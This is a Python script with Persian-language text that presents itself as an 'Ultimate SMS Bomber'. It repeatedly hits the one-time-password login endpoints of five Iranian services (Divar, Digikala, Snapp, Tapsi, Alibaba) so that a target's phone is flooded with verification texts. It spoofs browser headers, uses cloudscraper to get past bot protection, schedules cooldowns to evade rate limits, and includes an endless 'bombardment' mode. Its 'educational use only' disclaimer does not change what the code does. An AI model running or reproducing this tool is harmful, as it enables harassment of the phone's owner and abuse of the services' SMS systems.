import os
import sys
import time
import requests
import cloudscraper
from colorama import Fore, Style, init

init(autoreset=True)

# =====================================================================
# تنظیمات کلی
# =====================================================================
VERSION = "2.0"
# کول‌داون هر سرویس به ثانیه بعد از خطای محدودیت
COOLDOWN = {
    "دیوار": 30,
    "دیجی‌کالا": 300,
    "اسنپ": 5,
    "تپسی": 120,
    "علی‌بابا": 60,
}

# وضعیت کول‌داون
service_cooldown_until = {}

# آمار
stats = {
    "کل تلاش": 0,
    "موفق": 0,
    "ناموفق": 0,
    "محدود": 0,
}

# =====================================================================
# توابع کمکی
# =====================================================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print(Fore.RED + r"""
   ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
   ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
   ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝
   ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
   ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
    """)
    print(Fore.YELLOW + f"           Ultimate SMS Bomber  |  Version {VERSION}")
    print(Fore.RED + "   ⚠️  فقط برای تست شخصی و آموزشی! مسئولیت استفاده بر عهده شماست.\n")

def normalize_snap_phone(phone):
    """تبدیل شماره به فرمت +98 برای اسنپ"""
    if phone.startswith('0'):
        phone = phone[1:]
    return f"+98{phone}"

def is_ready(service_name):
    """بررسی می‌کند که آیا سرویس آماده ارسال است یا در کول‌داون"""
    if service_name in service_cooldown_until:
        if time.time() < service_cooldown_until[service_name]:
            remaining = int(service_cooldown_until[service_name] - time.time())
            print(Fore.YELLOW + f"   ⏸️ [{service_name}] در کول‌داون ({remaining} ثانیه باقی‌مانده)")
            return False
        else:
            del service_cooldown_until[service_name]
    return True

def set_cooldown(service_name):
    """تنظیم کول‌داون برای سرویس بعد از خطا"""
    cd = COOLDOWN.get(service_name, 60)
    service_cooldown_until[service_name] = time.time() + cd
    print(Fore.YELLOW + f"   ⏳ [{service_name}] برای {cd} ثانیه در کول‌داون قرار گرفت.")

def get_time():
    return time.strftime('%H:%M:%S')

# =====================================================================
# سرویس‌ها
# =====================================================================
def send_divar_sms(phone_number):
    if not is_ready("دیوار"): return
    url = "https://api.divar.ir/v8/auth/open-initiate-page"
    scraper = cloudscraper.create_scraper()
    headers = {
        "accept": "application/json-divar-filled",
        "content-type": "application/json",
        "origin": "https://divar.ir",
        "referer": "https://divar.ir/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
        "x-web-serving-mode": "desktop",
        # ⚠️ کوکی خود را از مرورگر کپی کنید (در صورت خطای 403)
        "cookie": "did=...; cdid=...; ..."
    }
    payload = {
        "specification": {"page": 1, "data": {"data": {
            "phone": {"str": {"value": phone_number}},
            "send_code_method": {"str": {"value": "SMS"}}
        }}},
        "is_reload": False
    }
    try:
        r = scraper.post(url, json=payload, headers=headers)
        if r.status_code == 200:
            print(Fore.GREEN + f"✅ [دیوار] [{get_time()}] پیامک ارسال شد.")
            stats["موفق"] += 1
        elif r.status_code == 429:
            print(Fore.RED + f"❌ [دیوار] [{get_time()}] محدودیت: {r.text[:80]}")
            set_cooldown("دیوار"); stats["محدود"] += 1
        else:
            print(Fore.RED + f"❌ [دیوار] [{get_time()}] خطا {r.status_code}: {r.text[:80]}")
            stats["ناموفق"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [دیوار] خطا: {e}")
        stats["ناموفق"] += 1

def send_digikala_sms(phone_number):
    if not is_ready("دیجی‌کالا"): return
    url = "https://api.digikala.com/v1/user/authenticate/"
    session = requests.Session()
    headers = {
        "content-type": "application/json",
        "origin": "https://www.digikala.com",
        "referer": "https://www.digikala.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    payload = {"backUrl": "/", "username": phone_number, "otp_call": "false"}
    try:
        r = session.post(url, json=payload, headers=headers)
        if r.status_code == 200:
            print(Fore.GREEN + f"✅ [دیجی‌کالا] [{get_time()}] پیامک ارسال شد.")
            stats["موفق"] += 1
        elif r.status_code == 400:
            print(Fore.RED + f"❌ [دیجی‌کالا] [{get_time()}] محدودیت: {r.text[:80]}")
            set_cooldown("دیجی‌کالا"); stats["محدود"] += 1
        else:
            print(Fore.RED + f"❌ [دیجی‌کالا] [{get_time()}] خطا {r.status_code}: {r.text[:80]}")
            stats["ناموفق"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [دیجی‌کالا] خطا: {e}")
        stats["ناموفق"] += 1

def send_snapp_sms(phone_number):
    if not is_ready("اسنپ"): return
    url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    scraper = cloudscraper.create_scraper()
    headers = {
        "content-type": "application/json",
        "origin": "https://snapp.ir",
        "referer": "https://snapp.ir/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-requested-with": "XMLHttpRequest"
    }
    payload = {"cellphone": normalize_snap_phone(phone_number)}
    try:
        r = scraper.post(url, json=payload, headers=headers)
        if r.status_code == 200:
            print(Fore.GREEN + f"✅ [اسنپ] [{get_time()}] درخواست ارسال شد (اگر شماره جدید باشه پیامک میاد).")
            stats["موفق"] += 1
        elif r.status_code == 429:
            print(Fore.RED + f"❌ [اسنپ] [{get_time()}] محدودیت: {r.text[:80]}")
            set_cooldown("اسنپ"); stats["محدود"] += 1
        else:
            print(Fore.RED + f"❌ [اسنپ] [{get_time()}] خطا {r.status_code}: {r.text[:80]}")
            stats["ناموفق"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [اسنپ] خطا: {e}")
        stats["ناموفق"] += 1

def send_tapsi_sms(phone_number):
    if not is_ready("تپسی"): return
    url = "https://tap33.me/api/v2/user"
    session = requests.Session()
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    payload = {"credential": {"phoneNumber": phone_number, "role": "PASSENGER"}}
    try:
        r = session.post(url, json=payload, headers=headers)
        if r.status_code == 200:
            print(Fore.GREEN + f"✅ [تپسی] [{get_time()}] پیامک ارسال شد.")
            stats["موفق"] += 1
        elif r.status_code in (406, 429):
            print(Fore.RED + f"❌ [تپسی] [{get_time()}] محدودیت: {r.text[:80]}")
            set_cooldown("تپسی"); stats["محدود"] += 1
        else:
            print(Fore.RED + f"❌ [تپسی] [{get_time()}] خطا {r.status_code}: {r.text[:80]}")
            stats["ناموفق"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [تپسی] خطا: {e}")
        stats["ناموفق"] += 1

def send_alibaba_sms(phone_number):
    if not is_ready("علی‌بابا"): return
    url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    scraper = cloudscraper.create_scraper()
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://www.alibaba.ir",
        "referer": "https://www.alibaba.ir/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
        "ab-alohomora": "opwttSLZ5UF1EMoxQXx4PB",
        "ab-channel": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,desktop,Chrome,154.0.0.0,N,N,Windows,10,3.282.1",
        "tracing-device": "N,Chrome,154.0.0.0,N,N,Windows",
        "tracing-sessionid": "1791041200703"
    }
    payload = {"phoneNumber": phone_number}
    try:
        r = scraper.post(url, json=payload, headers=headers)
        if r.status_code == 200:
            print(Fore.GREEN + f"✅ [علی‌بابا] [{get_time()}] پیامک ارسال شد.")
            stats["موفق"] += 1
        elif r.status_code == 429:
            print(Fore.RED + f"❌ [علی‌بابا] [{get_time()}] محدودیت: {r.text[:80]}")
            set_cooldown("علی‌بابا"); stats["محدود"] += 1
        else:
            print(Fore.RED + f"❌ [علی‌بابا] [{get_time()}] خطا {r.status_code}: {r.text[:80]}")
            stats["ناموفق"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [علی‌بابا] خطا: {e}")
        set_cooldown("علی‌بابا"); stats["ناموفق"] += 1

# =====================================================================
# لیست سرویس‌ها
# =====================================================================
ALL_SERVICES = [
    ("دیوار", send_divar_sms),
    ("دیجی‌کالا", send_digikala_sms),
    ("اسنپ", send_snapp_sms),
    ("تپسی", send_tapsi_sms),
    ("علی‌بابا", send_alibaba_sms),
]

# =====================================================================
# نمایش آمار
# =====================================================================
def show_stats():
    print(Fore.CYAN + "\n" + "=" * 50)
    print(Fore.CYAN + f"  📊 آمار نهایی:")
    print(Fore.WHITE + f"  ✅ موفق:        {stats['موفق']}")
    print(Fore.RED + f"  ❌ ناموفق:      {stats['ناموفق']}")
    print(Fore.YELLOW + f"  🚫 محدود:       {stats['محدود']}")
    print(Fore.CYAN + f"  🔢 کل تلاش:     {stats['کل تلاش']}")
    print(Fore.CYAN + "=" * 50 + "\n")

# =====================================================================
# حالت ۱: ارسال به همه سرویس‌ها
# =====================================================================
def mode_all_services():
    phone = input(Fore.YELLOW + "شماره موبایل هدف (مثال: 09123456789): " + Fore.WHITE)
    interval = int(input(Fore.YELLOW + "فاصله بین هر دور (ثانیه): " + Fore.WHITE))
    count = int(input(Fore.YELLOW + "تعداد دورهای ارسال: " + Fore.WHITE))

    print(Fore.CYAN + f"\n🚀 شروع ارسال {count} دور با فاصله {interval} ثانیه برای {phone}\n")

    for i in range(count):
        print(Fore.MAGENTA + f"\n╔══════ دور {i+1} از {count} ══════╗")
        for name, func in ALL_SERVICES:
            stats["کل تلاش"] += 1
            try:
                func(phone)
            except Exception as e:
                print(Fore.RED + f"⚠️ [{name}] خطای کلی: {e}")
        if i < count - 1:
            print(Fore.CYAN + f"\n⏳ صبر {interval} ثانیه...")
            time.sleep(interval)

    show_stats()

# =====================================================================
# حالت ۲: ارسال به سرویس خاص
# =====================================================================
def mode_single_service():
    print(Fore.CYAN + "\nسرویس‌های موجود:")
    for i, (name, _) in enumerate(ALL_SERVICES, 1):
        print(Fore.WHITE + f"  {i}. {name}")
    
    choice = int(input(Fore.YELLOW + "\n👉 شماره سرویس مورد نظر: " + Fore.WHITE))
    if choice < 1 or choice > len(ALL_SERVICES):
        print(Fore.RED + "❌ انتخاب نامعتبر!")
        return
    
    service_name, service_func = ALL_SERVICES[choice - 1]
    phone = input(Fore.YELLOW + f"\nشماره موبایل هدف: " + Fore.WHITE)
    interval = int(input(Fore.YELLOW + "فاصله بین هر ارسال (ثانیه): " + Fore.WHITE))
    count = int(input(Fore.YELLOW + "تعداد ارسال: " + Fore.WHITE))

    print(Fore.CYAN + f"\n🚀 شروع ارسال {count} بار از {service_name} برای {phone}\n")

    for i in range(count):
        print(Fore.MAGENTA + f"\n╔══════ تلاش {i+1} از {count} ══════╗")
        stats["کل تلاش"] += 1
        try:
            service_func(phone)
        except Exception as e:
            print(Fore.RED + f"⚠️ خطای کلی: {e}")
        if i < count - 1:
            time.sleep(interval)

    show_stats()

# =====================================================================
# حالت ۳: ارسال انفجاری (بدون کول‌داون و توقف‌ناپذیر)
# =====================================================================
def mode_infinite_bomb():
    print(Fore.RED + "\n⚠️ حالت بمب انفجاری: تا زمانی که Ctrl+C نزنی ادامه می‌دهد!")
    print(Fore.YELLOW + "  توصیه: فقط برای سرویس‌هایی که محدودیت ندارن (مثل اسنپ) استفاده کن.")
    
    phone = input(Fore.YELLOW + "\nشماره موبایل هدف: " + Fore.WHITE)
    interval = float(input(Fore.YELLOW + "فاصله بین هر ارسال (ثانیه، مثال: 0.5): " + Fore.WHITE))
    
    print(Fore.RED + "\n🚨 شروع بمباران... برای توقف Ctrl+C بزن!\n")
    time.sleep(2)
    
    i = 0
    try:
        while True:
            i += 1
            print(Fore.MAGENTA + f"\n╔══════ تلاش {i} ══════╗")
            for name, func in ALL_SERVICES:
                stats["کل تلاش"] += 1
                try:
                    func(phone)
                except Exception as e:
                    pass
            time.sleep(interval)
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n⛔ بمباران متوقف شد.")
        show_stats()

# =====================================================================
# منوی اصلی
# =====================================================================
def main_menu():
    while True:
        show_banner()
        print(Fore.WHITE + Style.BRIGHT + "  📌 گزینه‌ها:")
        print(Fore.CYAN + "  ┌────────────────────────────────────────┐")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "1." + Fore.GREEN + " ارسال به همه سرویس‌ها         " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "2." + Fore.GREEN + " ارسال از یک سرویس خاص         " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "3." + Fore.RED + " بمباران انفجاری (بی‌پایان)    " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "4." + Fore.YELLOW + " نمایش آمار                    " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "0." + Fore.RED + " خروج                          " + Fore.CYAN + "│")
        print(Fore.CYAN + "  └────────────────────────────────────────┘")

        choice = input(Fore.YELLOW + "\n👉 انتخاب: " + Fore.WHITE)

        if choice == '1':
            mode_all_services()
        elif choice == '2':
            mode_single_service()
        elif choice == '3':
            mode_infinite_bomb()
        elif choice == '4':
            show_stats()
        elif choice == '0':
            print(Fore.GREEN + "\n👋 خدانگهدار!")
            sys.exit()
        else:
            print(Fore.RED + "❌ گزینه نامعتبر!")

        input(Fore.YELLOW + "\n🔹 برای بازگشت به منو Enter بزنید...")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n⛔ برنامه متوقف شد.")
        sys.exit()